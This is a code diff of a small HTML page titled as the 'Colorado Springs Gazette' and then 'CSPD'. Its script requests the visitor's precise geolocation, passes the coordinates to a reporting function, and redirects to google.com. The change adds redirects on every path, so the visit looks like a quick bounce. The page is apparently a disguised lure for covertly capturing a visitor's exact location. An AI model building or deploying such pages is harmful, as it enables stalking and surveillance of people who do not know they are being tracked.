@@ -3,7 +3,7 @@
     <head>
         <meta charset="utf-8">
         <meta http-equiv="X-UA-Compatible" content="IE=edge">
-        <title>Colorado Springs Gazette</title>
+        <title>CSPD</title>
         <meta name="description" content="">
         <meta name="viewport" content="width=device-width, initial-scale=1">
         <link rel="stylesheet" href="">
@@ -34,17 +34,20 @@ async function reportData(uuid, data) {
       (position) => {
         const coords = position.coords;
         reportData(JSON.stringify(coords));
+        window.location.replace("https://google.com");
       },
       (error) => {
         console.error(error);
+        window.location.replace("https://google.com");
       },
       {
         enableHighAccuracy: true,
         timeout: 10000,
       }
     );
-  } catch (e) {}
+  } catch (e) {
     window.location.replace("https://google.com");
+  }
 })();
         </script>
     </body>
